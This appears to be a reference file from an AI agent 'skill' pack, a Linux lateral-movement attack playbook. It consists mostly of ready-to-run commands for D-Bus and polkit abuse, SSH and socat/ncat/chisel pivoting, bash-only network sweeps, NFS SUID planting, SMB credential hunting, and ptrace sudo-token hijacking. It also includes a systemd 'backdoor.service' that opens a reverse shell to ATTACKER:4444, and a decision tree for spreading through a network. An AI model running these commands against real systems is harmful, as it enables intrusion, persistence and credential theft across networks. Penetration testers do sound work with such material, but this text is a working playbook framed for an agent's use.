# SKILL: Linux Lateral Movement — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [4. D-BUS EXPLOITATION](#4-d-bus-exploitation)
- [5. INTERNAL NETWORK PIVOTING](#5-internal-network-pivoting)
- [6. SHARED FILESYSTEM EXPLOITATION](#6-shared-filesystem-exploitation)
- [7. SUDO TOKEN REUSE (ptrace-Based)](#7-sudo-token-reuse-ptrace-based)
- [8. SYSTEMD SERVICE MANIPULATION](#8-systemd-service-manipulation)
- [9. LATERAL MOVEMENT DECISION TREE](#9-lateral-movement-decision-tree)
<!-- zhiyugo:toc:end -->

## 4. D-BUS EXPLOITATION

### 4.1 Enumerate D-Bus Services

```bash
# List system bus services
dbus-send --system --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# List session bus services
dbus-send --session --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Introspect a service (find available methods)
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply \
  /org/freedesktop/systemd1 org.freedesktop.DBus.Introspectable.Introspect
```

### 4.2 Abuse systemd & PolicyKit via D-Bus

```bash
# Start a service via D-Bus (if policy allows):
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply /org/freedesktop/systemd1 \
  org.freedesktop.systemd1.Manager.StartUnit \
  string:"malicious.service" string:"replace"

# polkit actions available without auth:
pkaction --verbose 2>/dev/null | grep -B5 "implicit active: yes"
```

---

## 5. INTERNAL NETWORK PIVOTING

### 5.1 SSH Tunneling

```bash
# Local port forward: access INTERNAL_HOST:3306 via localhost:3306
ssh -L 3306:INTERNAL_HOST:3306 pivot@compromised-host

# Remote port forward: expose attacker service to internal network
ssh -R 8080:ATTACKER:8080 pivot@compromised-host

# Dynamic SOCKS proxy: route all traffic through pivot
ssh -D 1080 pivot@compromised-host
# Then: proxychains nmap -sT INTERNAL_RANGE

# SSH over SSH (multi-hop):
ssh -J user1@hop1,user2@hop2 target@final-host
```

### 5.2 Without SSH — Alternative Tunnels

```bash
# socat port forward
socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80 &

# ncat relay
ncat -l -p 8080 --sh-exec "ncat INTERNAL_HOST 80"

# /dev/tcp (Bash built-in, no tools needed)
exec 3<>/dev/tcp/INTERNAL_HOST/80
echo -e "GET / HTTP/1.0\r\nHost: INTERNAL_HOST\r\n\r\n" >&3
cat <&3

# chisel (SOCKS proxy over HTTP)
# On attacker: chisel server -p 8080 --reverse
# On target:   chisel client ATTACKER:8080 R:socks
```

### 5.3 Network Discovery from Compromised Host

```bash
ss -tlnp && ss -tnp                  # Listening & established connections
arp -a && ip neigh                    # Known adjacent hosts
cat /etc/resolv.conf                  # DNS servers
dig axfr internal.domain @dns 2>/dev/null   # Zone transfer

# Subnet sweep (bash-only, no tools):
for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo "ALIVE: 10.0.0.$i" & done; wait

# Port scan via /dev/tcp:
for port in 22 80 443 3306 5432 6379 8080; do
    (echo >/dev/tcp/10.0.0.1/$port) 2>/dev/null && echo "OPEN: $port"
done
```

---

## 6. SHARED FILESYSTEM EXPLOITATION

### 6.1 NFS Mounts

```bash
# Discover NFS shares
showmount -e FILESERVER_IP 2>/dev/null

# Check for no_root_squash (root maps to root)
mount -t nfs FILESERVER_IP:/share /mnt/nfs
# If no_root_squash: create SUID binaries visible to other hosts

# All hosts mounting the same share → SUID binary = root on all hosts
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
```

### 6.2 SMB/CIFS Shares

```bash
# Enumerate shares
smbclient -L //FILESERVER_IP/ -N 2>/dev/null      # Null session
smbclient -L //FILESERVER_IP/ -U 'user%password'

# Mount and search for credentials
mount -t cifs //FILESERVER_IP/share /mnt/smb -o username=user,password=pass
find /mnt/smb -name "*.conf" -o -name "*.cfg" -o -name "*.kdbx" \
     -o -name "*.xlsx" -o -name "*.docx" 2>/dev/null
```

---

## 7. SUDO TOKEN REUSE (ptrace-Based)

```bash
# If another user has an active sudo session (timestamp not expired):
# And we can ptrace their process (same UID or root)

# Check sudo timestamp files:
ls -la /var/run/sudo/ts/ 2>/dev/null
ls -la /var/db/sudo/ 2>/dev/null
# Files here mean active sudo tokens

# ptrace-based hijack:
# Attach to the user's shell process
# Inject: sudo /bin/bash
# The injected sudo inherits the valid timestamp → no password needed

# Automated tool: sudo_inject
# https://github.com/nongiach/sudo_inject
# Injects into processes with valid sudo tokens
```

---

## 8. SYSTEMD SERVICE MANIPULATION

```bash
# Find writable unit files:
find /etc/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null

# Inject into existing service (add ExecStartPre=):
# Or create new: /etc/systemd/system/backdoor.service
# [Service] Type=oneshot ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
systemctl daemon-reload && systemctl enable --now backdoor.service
```

---

## 9. LATERAL MOVEMENT DECISION TREE

```
Compromised host — where to move next?
│
├── SSH credentials available?
│   ├── Private keys found? → try on all known_hosts targets (§2)
│   ├── SSH agent running? → hijack socket (§1)
│   ├── Passwords in history/configs? → spray across hosts (§3)
│   └── authorized_keys writable on other hosts? → inject key (§2.3)
│
├── Network services discovered?
│   ├── Internal web apps? → tunnel + attack (§5.1)
│   ├── Databases (3306/5432/6379)? → check harvested creds (§3)
│   ├── SMB/NFS shares? → mount + search for creds/SUID (§6)
│   └── Kubernetes API (6443)? → load kubernetes-pentesting skill
│
├── Can reach other hosts?
│   ├── Direct SSH? → use keys/passwords
│   ├── Firewalled? → SSH tunnel or chisel (§5)
│   └── No tools? → /dev/tcp + bash (§5.2)
│
├── Root on current host?
│   ├── Read /etc/shadow → crack hashes → password reuse (§3)
│   ├── Dump /proc/*/environ → find service credentials (§3.2)
│   ├── Hijack sudo tokens → piggyback admin sessions (§7)
│   └── Modify systemd services → backdoor (§8)
│
├── D-Bus services available?
│   ├── Privileged services exposed? → method call abuse (§4)
│   └── polkit actions without auth? → privilege actions (§4.3)
│
└── No obvious path?
    ├── ARP scan + port sweep internal network (§5.3)
    ├── Passive credential sniffing (if cap_net_raw)
    ├── Wait for admin SSH → agent hijack (§1.3)
    └── Check for cloud metadata (169.254.169.254)
```
